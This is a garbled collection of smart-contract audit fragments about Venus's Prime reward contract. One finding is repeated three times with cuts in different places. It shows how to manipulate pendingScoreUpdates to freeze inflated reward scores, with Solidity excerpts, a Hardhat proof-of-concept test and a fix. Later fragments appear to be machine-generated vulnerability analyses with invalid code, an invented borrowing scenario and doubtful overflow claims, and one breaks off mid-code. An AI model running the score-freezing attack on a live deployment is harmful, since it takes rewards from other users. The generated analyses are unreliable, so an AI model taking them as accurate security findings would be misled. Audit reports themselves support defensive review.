tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

This function does not take into account the pending rewards that users may have earned but have not yet collected, leading to an incorrect calculation of the remaining reward time.\n2. The contract also uses a function called `_updateScore()` which calculates the end time for a user's score based on their prime token balance and the current block timestamp. This function does not take into account any changes in the reward speed, which can lead to errors when calculating the remaining time for users who have not yet collected their rewards.\n3. The contract has a vulnerability in its `updateScores()` function where it uses a for loop to update the scores of multiple users at once.

After updating the score for all markets, the function checks whether the remaining reward time is less than or equal to the current block timestamp.

This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2.

However, this conversion rate is not explicitly defined or validated in the code, which means that it could be incorrect and result in an inflated or deflated collateral value. Additionally, the code does not use any precision factors or rate multipliers to ensure accurate calculations, which further increases the risk of errors in collateral conversion.\n\nIn summary, the code is vulnerable because it uses a potentially inaccurate conversion rate for collateral calculation and does not include any safeguards to prevent miscalculations.",
                "poc_patch": "  Yes, the given smart contract code is vulnerable to the \"Faulty Calculation of Collateralization in Financial Smart Contracts\" vulnerability. The reason for this vulnerability is that the `borrowBalanceStored` function is not properly updated when the `exchangeRate` changes.\n\nHere's a potential PoC (Proof of Concept) to demonstrate the vulnerability:\n\n1. Alice deposits 10 XVS tokens and borrows 100 XVS tokens against her collateral.\n2. The exchange rate is updated to `exchangeRate = 2`.\n3. Bob tries to borrow 50 XVS tokens against Alice's collateral, but the system approves the loan because of a faulty calculation of collateralization.\n4. Bob's loan is now worth 100 XVS tokens, while Alice's collateral is only worth 20 XVS tokens (based on the updated exchange rate).\n5. Bob repays his loan, and the system wrongly determines that Alice's collateral is fully covered by her borrowed amount, even though she has only enough collateral to cover half of her borrowed amount.\n6. The system then liquidates Alice's position, resulting in a loss for both Bob and Alice.\n\nTo mitigate this vulnerability, the `borrowBalanceStored` function should be updated whenever the `exchangeRate` changes. This can be done by adding the following line of code:\n```csharp\nvToken.borrowBalanceStored(user) = vToken.borrowBalanceStored(user) * exchangeRate;\n```\nThis ensures that the borrow balance is properly updated when the exchange rate changes, resulting in more accurate calculations of collateralization and reducing the risk of financial losses due to faulty smart contract code.",

The reason for this is that the code does not have a distinct liquidation threshold that exceeds the maximum LTV ratio by a comfortable margin. Instead, it uses the `borrowBalanceStored` function from the `IVToken` interface to calculate the borrower's current loan balance and compares it to the `xvsBalanceForScore` value to determine whether the borrower is undercollateralized or not.\n\nHowever, this function has a vulnerability of its own. The `borrowBalanceStored` function returns the amount of the borrower's loan that is still available for repayment. If the borrower has already paid some portion of their loan, then the value returned by this function will be lower than the actual balance of the loan. This can lead to situations where the smart contract mistakenly believes that a borrower is undercollateralized when they are not, which could result in liquidation of their assets without proper due process.\n\nTherefore, while the code itself is not vulnerable to the liquidation threshold and loan-to-value ratio buffer vulnerability, it does have a separate vulnerability that needs to be addressed.",

The reason for this is that the `calculateScore` function uses the `borrowBalanceStored` function from the `IVToken` interface to calculate the borrow balance of the user, which is then used to determine the capital for the user's account. However, this calculation does not take into account the liquidation threshold and loan-to-value ratio buffer, meaning that a small decrease in the collateral's value could cause the loan to become undercollateralized and trigger liquidation.\n\nTo mitigate this vulnerability, it would be necessary to modify the `calculateScore` function to take into account the liquidation threshold and loan-to-value ratio buffer. This could involve adding additional parameters to the function that represent these values, or modifying the calculation of the capital for the user's account to ensure that it takes into account the liquidation threshold and loan-to-value ratio buffer.\n\nHere is an example of how this might be implemented:\n```solidity\nfunction calculateScore(uint256 xvsBalanceForScore, uint256 borrow, uint256 supply, address market) public returns (uint256) {\n    IVToken vToken = IVToken(market);\n    uint256 exchangeRate = vToken.exchangeRateStored();\n    uint256 balanceOfAccount = vToken.balanceOf(user);\n    uint256 supply = (exchangeRate * balanceOfAccount) / EXP_SCALE;\n\n    // Calculate the liquidation threshold and loan-to-value ratio buffer\n    uint256 liquidationThreshold = 100 * 10 ** vToken.decimals(); // Assume a fixed value for now\n    uint256 loanToValueRatioBuffer = 100 * 10 ** vToken.decimals(); // Assume a fixed value for now\n\n    uint256 capital;\n    if (borrow > liquidationThreshold) {\n        capital = borrow - liquidationThreshold;\n    } else if (supply < loanToValueRatioBuffer) {\n        capital = supply * loanTo",

The absence of a gap between LTVs does not provide adequate room for collateral and token price fluctuations, preventing users from adding more collateral or reducing debt before facing liquidation.\n\nTo mitigate this vulnerability, a liquidation LTV that is larger than the maximal borrow LTV should be added, ensuring that positions can only be liquidated after reaching the liquidation LTV threshold. This allows for sufficient room for price fluctuations and grants users the opportunity to increase their collateral or decrease debt before facing liquidation.\n\nIn the smart contract code provided, there are a few potential issues that could contribute to this vulnerability:\n\n1. The `borrowBalanceStored` function in line 4 is used to calculate the borrow amount for each user, but it does not consider the maximum LTV allowed by the protocol.

The reason for this vulnerability is that the variable `capital` is calculated using a multiplication operation without proper checks or safe math operations. This can result in an overflow if the product of the two factors exceeds the maximum value that can be held by the variable type (in this case, uint256).\n\nTo fix this vulnerability, the following steps should be taken:\n\n1. Utilize safe math operations: Instead of multiplying `capital` with `(10 ** (18 - vToken.decimals()))`, use a safe multiplication operation that reverts the transaction if an overflow would occur. This can be achieved by using the SafeMath library provided by OpenZeppelin or by implementing a custom safe math operation.\n2. Reduce precision factors: If possible, reduce the precision factors used in computations to reduce the risk of overflows. For example, instead of using 10 ** (18 - vToken.decimals()), use a lower precision factor that reduces the risk of overflows.\n3. Check for possible overflows at each stage: Perform intermediate calculations with safe math operations to check for possible overflows and revert the transaction if necessary. This can help prevent errors in the calculation of `capital`.",
                "poc_patch": "  Based on the given vulnerability knowledge, I believe that this smart contract code is indeed vulnerable to an arithmetic overflow due to unsafe multiplication in financial computations.\n\nThe most likely type of vulnerability in this case is the \"Integer Overflow\" vulnerability, which occurs when a numerical operation results in a value that exceeds the maximum size that can be held by the variable type, causing the computation to produce incorrect or unexpected results.\n\nThe reason for this vulnerability is that the contract uses unsafe math operations without proper checks or the use of safe math libraries. For example, the `borrowBalanceStored()` function in the `IVToken` interface returns a value that is multiplied by the `exchangeRateStored()` value without any overflow protection. Similarly, the `balanceOf(user)` function also performs multiplication without checking for overflows.\n\nTo exploit this vulnerability, an attacker could send a transaction to the contract with a large input value, causing the multiplication of these values to exceed the maximum capacity of the variable type and resulting in an integer overflow. This would cause the computation to produce incorrect results or revert the transaction, potentially leading to a loss of funds for the user or the contract's users.\n\nTo prevent this vulnerability, developers should use safe math operations such as `SafeMath` from the OpenZeppelin library. They should also consider reducing the precision factors used in computations and performing the multiplication in steps, checking for possible overflows at each stage. Additionally, they can consider scaling input variables to ensure that intermediate results remain within safe bounds for the data types used.",

The reason for this is that the code does not have any logic that would lead to a mismatch between the amount of debt reduced and the collateral seized.\n\nThe smart contract code is responsible for calculating the collateral share, which is the percentage of the user's collateral that should be seized in return for reducing their debt. The collateral share is calculated based on the value of the user's collateral and the maximum amount of debt that can be liquidated.\n\nThe code first retrieves the user's collateral balance using the `_xvsBalanceForScore` function, which returns the amount of collateral available for liquidation. The code then calculates the maximum amount of debt that can be liquidated by calling the `borrowBalanceStored` function on the vToken contract and dividing it by the exchange rate using the `supply` variable.\n\nThe code then updates the prices of both the XVS token and the market using the `updateAssetPrice` and `updatePrice` functions from the oracle, respectively.\n\nFinally, the code calculates the capital value based on the collateral share and the maximum amount of debt that can be liquidated, using the `_capitalForScore` function. The capital value is then multiplied by a constant (10^18) to ensure that it has the same precision as the XVS 